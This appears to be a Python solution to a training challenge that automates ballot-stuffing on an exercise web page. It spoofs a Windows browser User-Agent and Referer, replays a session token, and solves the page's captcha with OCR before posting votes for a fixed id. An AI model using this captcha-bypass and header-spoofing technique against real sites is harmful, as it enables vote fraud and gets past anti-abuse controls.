#!/usr/bin/python3
""" Write a script or a program that votes 1024 times for your id here: http://158.69.76.135/level3.php """
""" We only take votes from Windows users. """
import requests
try:
    from PIL import Image
except ImportError:
    import Image
import pytesseract

url = "http://158.69.76.135/level3.php"
captcha = "http://158.69.76.135/captcha.php"
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0', 'Referer': 'http://158.69.76.135/level2.php'}

with requests.session() as client:
    for i in range(10):
        key = client.get(url, headers=headers)
        img_captcha = client.get(captcha, headers=headers)
        key_dic = key.cookies.get_dict()
        cookies = key.cookies['HoldTheDoor']
        # phpsessid = key.cookies['PHPSESSID']

        open_img = open('captcha_img.png', 'wb')
        open_img.write(img_captcha.content)
        open_img.close()

        convert_text = pytesseract.image_to_string(Image.open('captcha_img.png'))
        print(convert_text, type(convert_text))

        data_post = {"id": 93012, "holdthedoor": "Submit", "key": key_dic['HoldTheDoor'], "captcha": convert_text}
        client.post(url, data=data_post, cookies={'HoldTheDoor': cookies}, headers=headers)
